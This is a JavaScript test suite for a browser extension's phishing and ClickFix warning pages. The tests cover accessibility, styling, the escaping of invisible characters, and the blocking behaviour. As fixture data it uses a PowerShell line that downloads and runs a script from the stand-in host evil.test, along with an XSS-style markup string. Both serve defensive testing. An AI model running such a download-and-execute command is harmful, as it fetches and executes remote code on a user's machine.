const { test } = require("node:test");
const assert = require("node:assert/strict");
const { readFileSync } = require("node:fs");

const SCRIPT_PATH = require.resolve("./interstitial.js");

test("interstitial status changes are exposed through an accessible live region", () => {
  const html = readFileSync(require.resolve("./interstitial.html"), "utf8");
  assert.match(html, /<main[^>]+role="alert"[^>]+aria-live="assertive"/);
  assert.match(html, /id="yp-title"[^>]+tabindex="-1"/);
});

test("the command preview is explicitly LTR and bidi-isolated", () => {
  const html = readFileSync(require.resolve("./interstitial.html"), "utf8");
  const css = readFileSync(require.resolve("./interstitial.css"), "utf8");
  assert.match(html, /id="yp-command-label"[^>]*>Clipboard text \(control characters shown as ⟦…⟧\)/);
  assert.match(html, /id="yp-command-preview"[^>]+dir="ltr"/);
  assert.match(css, /\.yp-command-preview\s*\{[\s\S]*?direction:\s*ltr;[\s\S]*?unicode-bidi:\s*isolate;/);
});

// Issue #76 — the device-flow page is only reached for a hard block, so it
// keeps the default red rather than overriding to the warn-level orange.
test("the device-flow interstitial renders as a blocking red page", () => {
  const css = readFileSync(require.resolve("./interstitial.css"), "utf8");
  assert.doesNotMatch(css, /\.yp-kind-device-flow\s*\{[^}]*--yp-bg/);
});

test("interstitial body copy uses one font size across every warning kind", () => {
  const css = readFileSync(require.resolve("./interstitial.css"), "utf8");
  [".yp-message", ".yp-hint", ".yp-command-reason", ".yp-command-label"].forEach((selector) => {
    assert.match(
      css,
      new RegExp(`\\${selector}\\s*\\{[^}]*font-size:\\s*var\\(--yp-text-size\\)`),
      `${selector} must use the shared body size`
    );
  });
  // The phishing hint stays emphasized by weight alone.
  assert.doesNotMatch(css, /\.yp-kind-phishing \.yp-hint\s*\{[^}]*font-size/);
});

function fakeNode({ hidden = false } = {}) {
  const listeners = new Map();
  const classes = new Set();
  return {
    hidden,
    disabled: false,
    textContent: "",
    dataset: {},
    classList: {
      add(...names) {
        names.forEach((name) => classes.add(name));
      },
      contains(name) {
        return classes.has(name);
      },
    },
    addEventListener(type, listener) {
      listeners.set(type, listener);
    },
    // Warning copy builds emphasis from child elements, so textContent has to
    // aggregate what is appended.
    appendChild(node) {
      this.textContent += node.textContent;
      return node;
    },
    replaceChildren(...nodes) {
      this.textContent = "";
      nodes.forEach((node) => this.appendChild(node));
    },
    focus() {
      this.focused = true;
    },
    async fire(type) {
      return listeners.get(type)?.call(this, { type });
    },
  };
}

async function loadClickfixInterstitial({
  mode = "warn",
  text = "powershell iwr https://evil.test/a.ps1 | iex",
} = {}) {
  const ids = [
    "yp-brand", "yp-icon", "yp-title", "yp-message", "yp-hint",
    "yp-command-reason", "yp-command-label", "yp-command-preview",
    "yp-btn-close", "yp-btn-proceed", "yp-btn-reanalyse",
    "yp-btn-continue", "yp-btn-leave",
  ];
  const elements = new Map(ids.map((id) => [
    id,
    fakeNode({
      hidden: id === "yp-command-reason" || id === "yp-command-label" || id === "yp-command-preview" ||
        id === "yp-btn-proceed" || id === "yp-btn-reanalyse" ||
        id === "yp-btn-continue" || id === "yp-btn-leave",
    }),
  ]));
  const documentListeners = new Map();
  const body = fakeNode();
  const sent = [];
  let copyCalls = 0;

  global.location = { search: "?kind=clickfix&request=request-a" };
  global.document = {
    title: "",
    body,
    getElementById(id) {
      return elements.get(id);
    },
    createElement(tag) {
      const node = fakeNode();
      node.tagName = String(tag).toUpperCase();
      return node;
    },
    createTextNode(text) {
      return { textContent: text };
    },
    addEventListener(type, listener) {
      documentListeners.set(type, listener);
    },
  };
  global.chrome = {
    runtime: {
      async sendMessage(message) {
        sent.push(message);
        if (message.type === "get_clickfix_warning") {
          return {
            ok: true,
            mode,
            source_host: "source.test",
            text,
            reasons: ["system or scripting tool", "download or execution behavior"],
            tool: "powershell",
            behavior: "iwr",
          };
        }
        if (message.type === "clickfix_copy_anyway") {
          copyCalls += 1;
          return { ok: true };
        }
        return { ok: true };
      },
    },
  };

  delete require.cache[SCRIPT_PATH];
  require(SCRIPT_PATH);
  await documentListeners.get("DOMContentLoaded")();

  return {
    body,
    sent,
    element(id) {
      return elements.get(id);
    },
    get copyCalls() {
      return copyCalls;
    },
  };
}

test("strict ClickFix interstitial shows the exact command with no bypass", async () => {
  const page = await loadClickfixInterstitial({ mode: "strict" });

  assert.equal(page.element("yp-title").textContent, "Dangerous command blocked");
  assert.match(page.element("yp-message").textContent, /source\.test/);
  assert.match(page.element("yp-command-preview").textContent, /^powershell/);
  assert.match(page.element("yp-command-reason").textContent, /powershell/);
  assert.match(page.element("yp-command-reason").textContent, /iwr/);
  assert.equal(page.element("yp-command-reason").hidden, false);
  assert.equal(page.element("yp-command-preview").hidden, false);
  assert.equal(page.element("yp-title").focused, true);
  assert.equal(page.element("yp-btn-proceed").hidden, true);
});

test("ClickFix preview visibly escapes every C0/C1 and policy-invisible character", async () => {
  const c0AndC1 = [
    ...Array.from({ length: 0x20 }, (_value, codePoint) => codePoint),
    ...Array.from({ length: 0x21 }, (_value, index) => 0x7F + index),
  ];
  const policyInvisibles = [
    0x00AD, 0x034F, 0x061C, 0x115F, 0x1160, 0x17B4, 0x17B5,
    ...Array.from({ length: 5 }, (_value, index) => 0x180B + index),
    ...Array.from({ length: 5 }, (_value, index) => 0x200B + index),
    ...Array.from({ length: 5 }, (_value, index) => 0x202A + index),
    ...Array.from({ length: 16 }, (_value, index) => 0x2060 + index),
    0xFEFF,
  ];
  const escapedCodePoints = [...new Set([...c0AndC1, ...policyInvisibles, 0x2028, 0x2029])];
  const rawText = `before${String.fromCodePoint(...escapedCodePoints)}after`;
  const page = await loadClickfixInterstitial({ text: rawText });
  const preview = page.element("yp-command-preview").textContent;

  assert.ok(preview.startsWith("before"));
  assert.ok(preview.endsWith("after"));
  for (const codePoint of escapedCodePoints) {
    const expected = codePoint === 0x09
      ? "⟦TAB⟧"
      : codePoint === 0x0A
        ? "⟦LF⟧\n"
        : codePoint === 0x0D
          ? "⟦CR⟧"
          : `⟦U+${codePoint.toString(16).toUpperCase().padStart(4, "0")}⟧`;
    assert.ok(preview.includes(expected), `missing visible token for U+${codePoint.toString(16)}`);
  }

  const withoutIntentionalLineBreak = preview.replaceAll("⟦LF⟧\n", "⟦LF⟧");
  assert.doesNotMatch(
    withoutIntentionalLineBreak,
    /[\p{Cc}\p{Cf}\u00AD\u034F\u061C\u115F\u1160\u17B4\u17B5\u180B-\u180F\u200B-\u200F\u2028\u2029\u202A-\u202E\u2060-\u206F\uFEFF]/u
  );
});

test("diagnostic rendering leaves ordinary markup-like text inert and unchanged", async () => {
  const rawText = '<img src=x onerror="alert(1)"> && powershell';
  const page = await loadClickfixInterstitial({ text: rawText });

  assert.equal(page.element("yp-command-preview").textContent, rawText);
});

test("warn ClickFix interstitial requires two clicks before copying", async () => {
  const page = await loadClickfixInterstitial({ mode: "warn" });
  const proceed = page.element("yp-btn-proceed");

  assert.equal(proceed.hidden, false);
  await proceed.fire("click");
  assert.equal(page.copyCalls, 0);
  assert.match(proceed.textContent, /^Confirm/);

  await proceed.fire("click");
  assert.equal(page.copyCalls, 1);
  // The confirmation is the last required click (issue #3): the tab closes
  // right after the approved copy, with no extra "return to page" step.
  const types = page.sent.map((message) => message.type);
  assert.ok(types.indexOf("clickfix_copy_anyway") < types.indexOf("close_tab"));
  assert.deepEqual(page.sent.at(-1), { type: "close_tab" });
});

// Issue #76 — no content script runs on an extension page, so each warning
// asserts its own action badge: blocking pages get the red alert, warn-level
// pages the orange "!".
test("the ClickFix interstitial asserts a badge matching its severity", async () => {
  const blocked = await loadClickfixInterstitial({ mode: "strict" });
  assert.equal(badgeOf(blocked)?.state, "blocked");

  const warned = await loadClickfixInterstitial({ mode: "warn" });
  assert.equal(badgeOf(warned)?.state, "suspicious");
});

function badgeOf(page) {
  return page.sent.find((message) => message.type === "set_icon_state") ?? null;
}

test("closing a ClickFix warning consumes the request before closing the tab", async () => {
  const page = await loadClickfixInterstitial({ mode: "warn" });
  await page.element("yp-btn-close").fire("click");

  const types = page.sent.map((message) => message.type);
  assert.ok(types.indexOf("clickfix_cancel") < types.indexOf("close_tab"));
});

// =============================================================================
// DEVICE-CODE PHISHING (issue #39)
// =============================================================================

async function loadDeviceFlowInterstitial({
  response = { ok: true, provider: "GitHub", source_fqdn: "evil.example", reason: "cross_site" },
} = {}) {
  const ids = [
    "yp-brand", "yp-icon", "yp-title", "yp-message", "yp-hint",
    "yp-command-reason", "yp-command-label", "yp-command-preview",
    "yp-btn-close", "yp-btn-proceed", "yp-btn-reanalyse",
    "yp-btn-continue", "yp-btn-leave",
  ];
  const elements = new Map(ids.map((id) => [
    id,
    fakeNode({
      hidden: id === "yp-command-reason" || id === "yp-command-label" || id === "yp-command-preview" ||
        id === "yp-btn-proceed" || id === "yp-btn-reanalyse" ||
        id === "yp-btn-continue" || id === "yp-btn-leave",
    }),
  ]));
  const documentListeners = new Map();
  const body = fakeNode();
  const sent = [];

  global.location = { search: "?kind=device_flow" };
  global.document = {
    title: "",
    body,
    getElementById(id) {
      return elements.get(id);
    },
    createElement(tag) {
      const node = fakeNode();
      node.tagName = String(tag).toUpperCase();
      return node;
    },
    createTextNode(text) {
      return { textContent: text };
    },
    addEventListener(type, listener) {
      documentListeners.set(type, listener);
    },
  };
  global.chrome = {
    runtime: {
      async sendMessage(message) {
        sent.push(message);
        if (message.type === "get_device_flow_warning") return response;
        return { ok: true };
      },
    },
  };

  delete require.cache[SCRIPT_PATH];
  require(SCRIPT_PATH);
  await documentListeners.get("DOMContentLoaded")();

  return {
    body,
    sent,
    element(id) {
      return elements.get(id);
    },
  };
}

test("the device-flow interstitial names the provider and the opening website", async () => {
  const page = await loadDeviceFlowInterstitial();

  assert.equal(page.element("yp-title").textContent, "Device-code phishing risk");
  assert.match(page.element("yp-message").textContent, /GitHub/);
  assert.match(page.element("yp-message").textContent, /evil\.example/);
  assert.match(page.element("yp-hint").textContent, /Close this tab/);
  assert.equal(page.element("yp-btn-close").textContent, "Close tab");
  assert.equal(page.body.classList.contains("yp-kind-device-flow"), true);
  assert.equal(page.element("yp-title").focused, true);
});

// Issue #93 — a blocking device-code interstitial is a hard block with no
// proceed action at all: the former developer bypass is gone.
test("the device-flow interstitial never offers a proceed action", async () => {
  const page = await loadDeviceFlowInterstitial();

  assert.equal(page.element("yp-btn-proceed").hidden, true);
  assert.equal(page.element("yp-btn-continue").hidden, true);

  const source = readFileSync(SCRIPT_PATH, "utf8");
  assert.doesNotMatch(source, /device_flow_continue|phishing_proceed|allow_bypass/);
});

test("a policy block names the blocked setting even without a source website", async () => {
  const page = await loadDeviceFlowInterstitial({
    response: { ok: true, provider: "GitHub", source_fqdn: null, reason: "policy" },
  });

  assert.equal(page.element("yp-title").textContent, "Device-code sign-in blocked");
  assert.match(page.element("yp-message").textContent, /GitHub/);
  assert.match(page.element("yp-message").textContent, /blocked by your settings/);
  assert.equal(page.element("yp-btn-proceed").hidden, true);
});

test("an expired device-flow warning shows no actions besides closing", async () => {
  const page = await loadDeviceFlowInterstitial({ response: { ok: false } });

  assert.match(page.element("yp-message").textContent, /No active device-code warning/);
  assert.equal(page.element("yp-btn-proceed").hidden, true);
  assert.equal(page.element("yp-btn-continue").hidden, true);
  // Nothing is being blocked any more, so the icon keeps its idle state.
  assert.equal(badgeOf(page), null);
});

test("the device-flow interstitial asserts the blocking badge", async () => {
  const page = await loadDeviceFlowInterstitial();

  assert.equal(badgeOf(page)?.state, "blocked");
  assert.match(badgeOf(page)?.title, /Device-code/);
});

test("closing the device-flow interstitial sends close_tab", async () => {
  const page = await loadDeviceFlowInterstitial();
  await page.element("yp-btn-close").fire("click");

  assert.deepEqual(page.sent.at(-1), { type: "close_tab" });
});

// =============================================================================
// PHISHING WARNING (issue #93) — a hard block with no proceed action.
// =============================================================================

async function loadPhishingInterstitial({
  response = { ok: true, fqdn: "evil.example", best_match_fqdn: "bank.test" },
} = {}) {
  const ids = [
    "yp-brand", "yp-icon", "yp-title", "yp-message", "yp-hint",
    "yp-command-reason", "yp-command-label", "yp-command-preview",
    "yp-btn-close", "yp-btn-proceed", "yp-btn-reanalyse",
    "yp-btn-continue", "yp-btn-leave",
  ];
  const elements = new Map(ids.map((id) => [
    id,
    fakeNode({
      hidden: id === "yp-command-reason" || id === "yp-command-label" || id === "yp-command-preview" ||
        id === "yp-btn-proceed" || id === "yp-btn-reanalyse" ||
        id === "yp-btn-continue" || id === "yp-btn-leave",
    }),
  ]));
  const documentListeners = new Map();
  const body = fakeNode();
  const sent = [];

  global.location = { search: "?kind=phishing" };
  global.document = {
    title: "",
    body,
    getElementById(id) {
      return elements.get(id);
    },
    createElement(tag) {
      const node = fakeNode();
      node.tagName = String(tag).toUpperCase();
      return node;
    },
    createTextNode(text) {
      return { textContent: text };
    },
    addEventListener(type, listener) {
      documentListeners.set(type, listener);
    },
  };
  global.chrome = {
    runtime: {
      async sendMessage(message) {
        sent.push(message);
        if (message.type === "get_phishing_warning") return response;
        return { ok: true };
      },
    },
  };

  delete require.cache[SCRIPT_PATH];
  require(SCRIPT_PATH);
  await documentListeners.get("DOMContentLoaded")();

  return {
    body,
    sent,
    element(id) {
      return elements.get(id);
    },
  };
}

test("the phishing interstitial names both sites and never offers a proceed action", async () => {
  const page = await loadPhishingInterstitial();

  assert.match(page.element("yp-message").textContent, /evil\.example/);
  assert.match(page.element("yp-message").textContent, /bank\.test/);
  assert.equal(badgeOf(page)?.state, "blocked");
  assert.equal(page.body.classList.contains("yp-kind-phishing"), true);
  assert.equal(page.element("yp-btn-proceed").hidden, true);
  assert.equal(page.element("yp-btn-continue").hidden, true);
});

test("an expired phishing warning offers nothing but closing either", async () => {
  const page = await loadPhishingInterstitial({ response: { ok: false } });

  assert.match(page.element("yp-message").textContent, /No active phishing warning/);
  assert.equal(page.element("yp-btn-proceed").hidden, true);
});

// =============================================================================
// Issue #62 — self-identifying severity line and centered ClickFix copy.
// =============================================================================

test("every interstitial names itself and its severity above the heading", async () => {
  const html = readFileSync(require.resolve("./interstitial.html"), "utf8");
  assert.match(html, /<p class="yp-brand" id="yp-brand">Yodel Phish<\/p>/);

  // Blocking (red) pages are Alerts; warn-level (orange) pages are Warnings —
  // the same split the background colour and the action badge already make.
  const blocked = await loadClickfixInterstitial({ mode: "strict" });
  assert.equal(blocked.element("yp-brand").textContent, "Yodel Phish Alert");

  const warned = await loadClickfixInterstitial({ mode: "warn" });
  assert.equal(warned.element("yp-brand").textContent, "Yodel Phish Warning");

  const deviceFlow = await loadDeviceFlowInterstitial();
  assert.equal(deviceFlow.element("yp-brand").textContent, "Yodel Phish Alert");

  const phishing = await loadPhishingInterstitial();
  assert.equal(phishing.element("yp-brand").textContent, "Yodel Phish Alert");
});

// The severity line travels with the badge, so the states that deliberately
// assert no badge -- nothing is being warned about any more -- must also claim
// no severity. (ClickFix expiry takes the same branch but only after its 5 s
// worker-binding retry, which is not worth spending in a unit test.)
test("a page with no warning left to show claims no severity", async () => {
  // The stub starts every node empty, so an untouched brand line is exactly
  // the HTML default, "Yodel Phish".
  const expiredDeviceFlow = await loadDeviceFlowInterstitial({ response: { ok: false } });
  assert.equal(expiredDeviceFlow.element("yp-brand").textContent, "");
  assert.equal(badgeOf(expiredDeviceFlow), null);

  const expiredPhishing = await loadPhishingInterstitial({ response: { ok: false } });
  assert.equal(expiredPhishing.element("yp-brand").textContent, "");
  assert.equal(badgeOf(expiredPhishing), null);
});

test("ClickFix prose is centered like every other kind; only the command keeps its left edge", () => {
  const css = readFileSync(require.resolve("./interstitial.css"), "utf8");

  for (const selector of [".yp-command-reason", ".yp-command-label"]) {
    assert.doesNotMatch(
      css,
      new RegExp(`\\${selector}\\s*\\{[^}]*text-align:\\s*left`),
      `${selector} must inherit the card's centering`
    );
  }
  // A command read from its true left edge is what shows its real structure.
  assert.match(css, /\.yp-command-preview\s*\{[^}]*text-align:\s*left/);

  // A preview wider than its container cannot be centered by `margin: auto`;
  // it overflows to one side instead, which is what looked off-centre.
  assert.match(css, /\.yp-command-preview\s*\{[^}]*width:\s*100%/);
  assert.match(
    css,
    /body\.yp-kind-clickfix-block \.yp-card,\s*body\.yp-kind-clickfix-warn \.yp-card\s*\{[^}]*max-width:\s*720px/
  );
});
